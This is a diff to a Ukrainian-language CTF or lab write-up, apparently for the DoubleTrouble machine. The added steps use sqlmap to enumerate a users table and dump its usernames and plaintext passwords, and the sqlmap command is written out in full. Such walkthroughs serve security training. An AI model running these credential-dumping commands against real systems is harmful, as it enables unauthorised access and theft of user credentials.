@@ -199,8 +199,19 @@ sqlmap -r sql -D doubletrouble --tables --batch
 
 <img width="1488" height="441" alt="image" src="https://github.com/user-attachments/assets/f355fe14-2308-4a0c-94b3-57a38cc24ebd" />
 
-
-
 В результаті виявляю таблицю users
 
+Оскільки ця таблиця може містити креди для входу, перевіряю її вміст. Використовую параметр --columns для виведення наявних стовпців у таблиці.
+
+<img width="616" height="352" alt="image" src="https://github.com/user-attachments/assets/5d419038-42f3-4e84-853b-7026ecd3b7c8" />
+
+В результаті виявляю стовпці users i password.
+
+Далі застосовую параметр --dump, щоб завантажити повну інформацію з бази даних.
+
+sqlmap -r sql -D doubletrouble -T users -C password,username --dump
+
+<img width="757" height="441" alt="image" src="https://github.com/user-attachments/assets/7ef33d50-c44f-492a-ab04-f0f53e3fe608" />
+
+В результаті виявляю два імені користувачів і їх паролі, які були збережені у відкритому вигляді та доступі в бд.
 
